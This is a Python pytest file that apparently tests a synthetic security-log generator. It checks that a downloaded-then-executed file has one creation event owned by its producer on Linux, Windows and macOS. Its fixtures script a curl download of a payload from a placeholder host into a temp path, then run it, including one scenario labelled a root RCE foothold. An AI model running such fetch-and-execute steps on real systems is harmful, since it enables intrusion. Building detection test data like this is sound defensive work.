# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Executable provenance: one creation per storyline image, owned by its real producer.

Generalizes the regression contributed in Cisco-Talos/EvidenceForge#489 (rrouzbeh) to every
supported platform and to images that no step delivers.
"""

import json
from pathlib import Path
from typing import Any

import pytest

from evidenceforge.generation.engine import GenerationEngine
from evidenceforge.models.scenario import Scenario

_PLATFORMS: dict[str, tuple[dict[str, Any], str, str, str, str]] = {
    "linux": (
        {"hostname": "APP", "ip": "10.88.0.20", "os": "Ubuntu 22.04", "type": "server"},
        "alex",
        "/usr/bin/curl",
        "curl -fsS -o {path} https://cdn.example.test/cache-sync",
        "/tmp/cache-sync",
    ),
    "windows": (
        {
            "hostname": "WS",
            "ip": "10.88.0.21",
            "os": "Windows 11",
            "type": "workstation",
            "assigned_user": "alex",
        },
        "alex",
        r"C:\Windows\System32\curl.exe",
        "curl.exe -fsS -o {path} https://cdn.example.test/cache-sync",
        r"C:\Users\alex\AppData\Local\Temp\cache-sync.exe",
    ),
    "macos": (
        {
            "hostname": "MAC",
            "ip": "10.88.0.30",
            "os": "macOS 27",
            "type": "workstation",
            "architecture": "arm64",
            "assigned_user": "alex",
        },
        "alex",
        "/usr/bin/curl",
        "curl -fsS -o {path} https://cdn.example.test/cache-sync",
        "/tmp/cache-sync",
    ),
    # An RCE foothold: root runs from a pre-existing shell without a login session.
    "macos-root-foothold": (
        {
            "hostname": "MAC",
            "ip": "10.88.0.30",
            "os": "macOS 27",
            "type": "workstation",
            "architecture": "arm64",
            "assigned_user": "alex",
        },
        "root",
        "/usr/bin/curl",
        "curl -fsS -o {path} https://cdn.example.test/cache-sync",
        "/tmp/cache-sync",
    ),
}


def _generate(tmp_path: Path, platform: str, *, download: bool) -> tuple[list[dict], dict]:
    system, actor, downloader, download_command, payload = _PLATFORMS[platform]
    steps: list[dict[str, Any]] = []
    if download:
        steps.append(
            {
                "id": "download",
                "time": "+2m",
                "actor": actor,
                "system": system["hostname"],
                "activity": "Download file",
                "events": [
                    {
                        "type": "process",
                        "process_name": downloader,
                        "command_line": download_command.format(path=payload),
                    }
                ],
            }
        )
    steps.append(
        {
            "id": "execute",
            "time": "+4m",
            "actor": actor,
            "system": system["hostname"],
            "activity": "Run file",
            "events": [
                {"type": "process", "process_name": payload, "command_line": f"{payload} --version"}
            ],
        }
    )
    data: dict[str, Any] = {
        "version": "1.0",
        "name": "executable-provenance-regression",
        "description": "Process artifact ownership regression",
        "generation_seed": 20261102,
        "environment": {
            "description": "One test host",
            "users": [
                {
                    "username": "alex",
                    "full_name": "Alex Example",
                    "email": "alex@example.test",
                    "primary_system": system["hostname"],
                }
            ],
            "systems": [system],
        },
        "time_window": {"start": "2026-10-20T10:00:00Z", "duration": "10m", "warmup": "1h"},
        "baseline_activity": {
            "description": "Low-volume fixture",
            "intensity": "low",
            "variation": "low",
        },
        "storyline": steps,
        "output": {"logs": [{"format": "ecar"}], "destination": str(tmp_path)},
    }
    if platform.startswith("macos"):
        data["macos_process_coverage"] = "partial"
    GenerationEngine(Scenario.model_validate(data), tmp_path).generate()
    rows = [
        json.loads(line)
        for path in tmp_path.rglob("ecar.json")
        for line in path.read_text().splitlines()
        if line
    ]
    ground_truth = json.loads((tmp_path / "GROUND_TRUTH.json").read_text())
    return rows, ground_truth


def _same_path(left: object, right: str) -> bool:
    return str(left or "").replace("\\", "/").casefold() == right.replace("\\", "/").casefold()


def _assert_single_owned_creation(tmp_path: Path, platform: str, *, download: bool) -> None:
    rows, ground_truth = _generate(tmp_path, platform, download=download)
    payload = _PLATFORMS[platform][4]
    births = {
        r["objectID"]: r for r in rows if r["object"] == "PROCESS" and r["action"] == "CREATE"
    }
    creates = [
        r
        for r in rows
        if r["object"] == "FILE"
        and r["action"] == "CREATE"
        and _same_path(r["properties"].get("file_path"), payload)
    ]
    executions = [r for r in births.values() if _same_path(r["properties"]["image_path"], payload)]
    assert len(creates) == 1
    assert len(executions) == 1
    (create,) = creates
    (execution,) = executions
    assert create["timestamp_ms"] < execution["timestamp_ms"]
    assert create["actorID"] != execution["objectID"]
    implied = json.dumps(ground_truth).count('"implied_image_create"')
    if download:
        assert births[create["actorID"]]["properties"]["image_path"] == _PLATFORMS[platform][2]
        assert implied == 0
    else:
        # No step delivered the image: the launching parent wrote it just before it ran.
        assert create["actorID"] == execution["actorID"]
        assert implied == 1


@pytest.mark.parametrize("download", [True, False], ids=["downloaded", "undelivered"])
@pytest.mark.parametrize("platform", sorted(_PLATFORMS))
def test_executable_has_one_creation_owned_by_its_producer_on_every_platform(
    tmp_path: Path, platform: str, download: bool
) -> None:
    _assert_single_owned_creation(tmp_path, platform, download=download)
